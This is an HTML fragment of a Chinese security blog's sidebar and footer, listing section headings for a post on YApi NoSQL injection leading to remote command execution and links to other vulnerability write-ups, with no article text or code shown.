class="toc-link" href="#0x01-%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">0x01 介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%8E%AF%E5%A2%83"><span class="toc-number">3.</span> <span class="toc-text">0x02 环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">0x03 漏洞分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">0x04 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%A6%82%E4%BD%95%E4%BC%A0%E5%85%A5%E4%B8%80%E4%B8%AA%E6%95%B0%E7%BB%84"><span class="toc-number">6.</span> <span class="toc-text">0x05 如何传入一个数组</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD"><span class="toc-number">7.</span> <span class="toc-text">0x06 注入判断</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-Token%E8%BD%AC%E6%8D%A2"><span class="toc-number">8.</span> <span class="toc-text">0x07 Token转换</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-RCE%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">9.</span> <span class="toc-text">0x08 RCE的原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E7%88%86%E7%A0%B4%E4%B8%80%E4%B8%8B"><span class="toc-number">10.</span> <span class="toc-text">0x09 爆破一下</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-%E6%80%BB%E7%BB%93"><span class="toc-number">11.</span> <span class="toc-text">0x10 总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/" title="YApi分析从NoSQL注入到RCE远程命令执行.md"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152204342.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="YApi分析从NoSQL注入到RCE远程命令执行.md"/></a><div class="content"><a class="title" href="/2023/03/05/YApi%E5%88%86%E6%9E%90%E4%BB%8ENoSQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C.md/" title="YApi分析从NoSQL注入到RCE远程命令执行.md">YApi分析从NoSQL注入到RCE远程命令执行.md</a><time datetime="2023-03-05T01:48:54.000Z" title="发表于 2023-03-05 09:48:54">2023-03-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/25/OAuth%202.0%20%E8%AE%A4%E8%AF%81%E5%92%8C%E6%94%BB%E5%87%BB%E9%9D%A2/" title="OAuth 2.0 认证和攻击面"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154457.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="OAuth 2.0 认证和攻击面"/></a><div class="content"><a class="title" href="/2023/02/25/OAuth%202.0%20%E8%AE%A4%E8%AF%81%E5%92%8C%E6%94%BB%E5%87%BB%E9%9D%A2/" title="OAuth 2.0 认证和攻击面">OAuth 2.0 认证和攻击面</a><time datetime="2023-02-25T02:22:44.000Z" title="发表于 2023-02-25 10:22:44">2023-02-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/12/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2022-44268)/" title="ImageMagick任意文件读取漏洞(CVE-2022-44268)"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152154568.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ImageMagick任意文件读取漏洞(CVE-2022-44268)"/></a><div class="content"><a class="title" href="/2023/02/12/ImageMagick%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E(CVE-2022-44268)/" title="ImageMagick任意文件读取漏洞(CVE-2022-44268)">ImageMagick任意文件读取漏洞(CVE-2022-44268)</a><time datetime="2023-02-12T09:19:00.000Z" title="发表于 2023-02-12 17:19:00">2023-02-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/28/%E5%89%8D%E7%AB%AFwebsocket%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E(CSWSH)/" title="前端websocket劫持漏洞(CSWSH)"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157832.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="前端websocket劫持漏洞(CSWSH)"/></a><div class="content"><a class="title" href="/2023/01/28/%E5%89%8D%E7%AB%AFwebsocket%E5%8A%AB%E6%8C%81%E6%BC%8F%E6%B4%9E(CSWSH)/" title="前端websocket劫持漏洞(CSWSH)">前端websocket劫持漏洞(CSWSH)</a><time datetime="2023-01-28T09:00:35.000Z" title="发表于 2023-01-28 17:00:35">2023-01-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/" title="应急/linux 挂D盾扫描方法"><img src="https://image-1257110520.cos.ap-beijing.myqcloud.com//new202302152157975.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="应急/linux 挂D盾扫描方法"/></a><div class="content"><a class="title" href="/2023/01/02/%E5%BA%94%E6%80%A5!linux%20%E6%8C%82D%E7%9B%BE%E6%89%AB%E6%8F%8F%E6%96%B9%E6%B3%95/" title="应急/linux 挂D盾扫描方法">应急/linux 挂D盾扫描方法</a><time datetime="2023-01-02T11:49:32.000Z" title="发表于 2023-01-02 19:49:32">2023-01-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2023 By Zeo</div><div class="footer_custom_text">Hi, welcome to my blog!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div></div></body></html>
